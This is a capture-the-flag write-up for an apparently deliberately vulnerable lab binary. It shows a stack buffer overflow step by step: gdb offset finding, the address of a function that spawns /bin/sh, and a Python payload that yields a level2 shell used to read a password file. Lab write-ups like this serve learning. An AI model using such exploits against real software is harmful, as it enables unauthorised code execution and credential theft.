## Flag1 README: Finding Flag1

We are now into `/home/user/level1`.

After listing all file, we can see there is `level1` into our directory.
We run it and it opens our standard input. We decided to try something like **coucou les amis**. Nothing..

We decided to take our all habits and dowload the file with: 

```bash
scp -P 4343 level1@localhost:/home/user/level1/level1 ~
```

And decompile it with our best friend: [Dogbolt](https://dogbolt.org/). In doing so, we realized there were buffer and a function called run where `/bin/sh` is called.

After doing some research, we find a plan. We need to do a `Buffer Overflow Attack` and rewrite into `eip` register to redirect ou programm execution to the function `run`.

Okay we have our attack plan but how we doing this.
First we need to find the size of our `stack`. In doing so, we will be able to know where to right the redirection code.
To find out, we used: 
```bash
gdb ./level1
(gdb) run <<< aA00aA01aA02aA03aA04aA05aA06aA07aA08aA09bA00bA01bA02bA03bA04bA05bA06bA07bA08bA09cA00cA01cA02cA03cA04cA05cA06cA07cA08cA09dA00dA01dA02dA03dA04dA05dA06dA07dA08dA09eA00eA01eA02eA03eA04eA05eA06eA07eA08eA09fA00fA01fA02fA03fA04fA05fA06fA07fA08fA09gA00gA01gA02gA03
Starting program: /home/user/level1/level1 <<< aA00aA01aA02aA03aA04aA05aA06aA07aA08aA09bA00bA01bA02bA03bA04bA05bA06bA07bA08bA09cA00cA01cA02cA03cA04cA05cA06cA07cA08cA09dA00dA01dA02dA03dA04dA05dA06dA07dA08dA09eA00eA01eA02eA03eA04eA05eA06eA07eA08eA09fA00fA01fA02fA03fA04fA05fA06fA07fA08fA09gA00gA01gA02gA03

Program received signal SIGSEGV, Segmentation fault.
0x39304162 in ?? ()
(gdb) i r
eax            0xbffff6f0	-1073744144
ecx            0xb7fd28c4	-1208145724
edx            0xbffff6f0	-1073744144
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff740	0xbffff740
ebp            0x38304162	0x38304162
esi            0x0	0
edi            0x0	0
eip            0x39304162	0x39304162
eflags         0x210282	[ SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

So we can se that our `eip` value is `0x39304162` which is `90Ab`. Since our computer is in little endian the true value is `bA09`. Wich means our stack is **76** (80 - 4) bytes long. So now we need to find out where the function `run` is.

So we use gdb again:
```bash
(gdb) i func
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
```
We can se that `run` is in `0x08048444`.
Perfect, we have all our ingredients, now time to cook.

We create our perfect string with python: 
```sh
python -c "print('\x90'*76 + '\x44\x84\x04\x08')"
```
 - print : python function for print
 - \x90: is char for nop into stack
 - \x44\x84\x04\x08: address of run but in little endian

So let's try this:
```sh
level1@RainFall:~$ python -c "print('\x90'*76 + '\x44\x84\x04\x08')" | ./level1 Good... Wait what?
Segmentation fault (core dumped)
level1@RainFall:~$ 
```

Look like something happen but /bin/sh did not run why ..?

Well it did but python is putting a CTL-D at the end of his exec.
So we need to find a wait to send our string without EOF.

After some research, here is how we did it:
```sh
level1@RainFall:~$ python -c "print('\x90'*76 + '\x44\x84\x04\x08')" > payload
level1@RainFall:~$ cat payload - | ./level1 
Good... Wait what?
whoami
level2
```
Oh ! Okay now we just have to go into `/home/user/level2` and cat the `.pass` file